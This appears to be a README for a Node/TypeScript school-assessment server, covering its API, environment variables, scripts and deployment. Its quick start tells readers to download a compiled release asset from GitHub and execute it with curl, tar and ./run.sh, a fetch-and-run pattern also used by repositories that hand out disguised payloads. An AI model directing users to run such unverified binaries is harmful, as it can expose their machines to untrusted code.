Quick start ‚Äî release download and execution
- This repository publishes compiled server releases. Download the server release asset from the Releases page and execute the file.
- Visit and download the release asset here: https://github.com/Blovespy90/test-school-server/releases

Example run (generic)
1. Download the release asset you need from the Releases page.
2. Example shell commands (replace <asset-url> with the actual asset link):
   - curl -L -o test-school-server.tar.gz "<asset-url>"
   - tar -xzf test-school-server.tar.gz
   - cd test-school-server
   - ./run.sh   # or ./test-school-server

If the release link does not load or if you cannot find the binary, check the Releases section on GitHub for available assets and instructions.

Local development (source)
1. Clone the repo
   - git clone https://github.com/Blovespy90/test-school-server.git
   - cd test-school-server
2. Install
   - npm ci
3. Environment
   - Copy .env.example to .env and set values
4. Start dev server
   - npm run dev
5. Seed data (optional)
   - npm run seed

Environment variables (core)
- PORT=3000
- MONGO_URI=mongodb://localhost:27017/test-school
- JWT_SECRET=change_this_secret
- NODE_ENV=development
- REDIS_URL=redis://localhost:6379  (optional for queueing)
Use the .env.example file in the repo root.

Database
- The server uses MongoDB with Mongoose schemas.
- Models:
  - User (roles: student, teacher, admin)
  - Course
  - Assessment
  - Question
  - Submission
  - Grade
- Run local MongoDB or use a cloud instance.
- Indexes: ensure proper indexes for queries on course and assessment ids.

API overview (core endpoints)
- Auth
  - POST /api/auth/login ‚Äî returns JWT
  - POST /api/auth/register ‚Äî create user
- Users
  - GET /api/users ‚Äî list users (admin)
  - GET /api/users/:id ‚Äî user details
- Courses
  - GET /api/courses
  - POST /api/courses
- Assessments
  - GET /api/assessments
  - POST /api/assessments
  - GET /api/assessments/:id
- Submissions
  - POST /api/assessments/:id/submissions ‚Äî start or submit
  - GET /api/submissions/:id ‚Äî status and answers
- Grades
  - GET /api/assessments/:id/grades
  - POST /api/submissions/:id/grade ‚Äî manual override

Sample request (JS fetch)
- const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });

Authentication
- JWT based, short lived access tokens.
- Role-based middleware checks.
- Use Authorization: Bearer <token> header for secured endpoints.

Scripts and CLI
- npm run start ‚Äî start production server (node build)
- npm run dev ‚Äî start with ts-node-dev for development
- npm run build ‚Äî compile TypeScript
- npm run lint ‚Äî run ESLint
- npm run test ‚Äî run Jest tests
- npm run seed ‚Äî seed DB with demo data
- CLI tools:
  - bin/ts-server-cli seed
  - bin/ts-server-cli migrate
  - bin/ts-server-cli clear-cache

Testing
- Unit tests cover services and controllers.
- Integration tests run with a test database.
- Tests run with:
  - npm run test
- Use NODE_ENV=test and a separate MongoDB instance for CI.

Docker
- Dockerfile builds an image with Node and production build.
- Example:
  - docker build -t test-school-server .
  - docker run -e MONGO_URI="mongodb://host:27017/test-school" -p 3000:3000 test-school-server

Logging and metrics
- The server logs requests and errors to stdout.
- Metric endpoints:
  - GET /api/health
  - GET /api/metrics  (Prometheus format)
- Use external collectors in production.

Security
- Input validation on all endpoints.
- Rate limit middleware for public routes.
- Sensitive keys live in environment variables.
- Use HTTPS and set secure cookie flags if using cookies.

Deployment notes
- For production, use a process manager like PM2 or a container runtime.
- Use a managed MongoDB for reliability.
- Attach a job worker for heavy grading tasks. Use Redis and a simple queue.
- Use horizontal scaling of stateless API servers.
